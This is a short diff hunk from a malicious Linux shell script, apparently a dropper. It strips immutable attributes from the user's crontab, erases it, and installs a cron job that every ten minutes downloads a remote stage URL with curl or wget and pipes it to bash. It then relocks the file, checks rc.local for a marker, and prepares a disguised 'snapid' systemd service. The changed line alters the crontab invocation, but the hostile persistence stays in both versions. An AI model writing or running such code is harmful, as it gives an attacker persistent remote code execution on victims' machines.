@@ -18,7 +18,7 @@ he_save='/tmp/rcupd'
 NAME=$(whoami)
 chattr -ai /var/spool/cron/${NAME}
 crontab -r
-(echo "*/10 * * * * (curl -fsSL ${stage_url}||wget -q -O- ${stage_url})|bash")|crontab -
+(echo "*/10 * * * * (curl -fsSL ${stage_url}||wget -q -O- ${stage_url})|bash")|crontab -e
 chattr +ai /var/spool/cron/${NAME}
 flag=$(/bin/cat /etc/rc.local|grep bHoL2W|grep -v grep|wc -l)
 if [[ ${NAME} == 'root' && ! -e '/usr/lib/systemd/system/snapid.service' ]] && program_exists systemctl; then
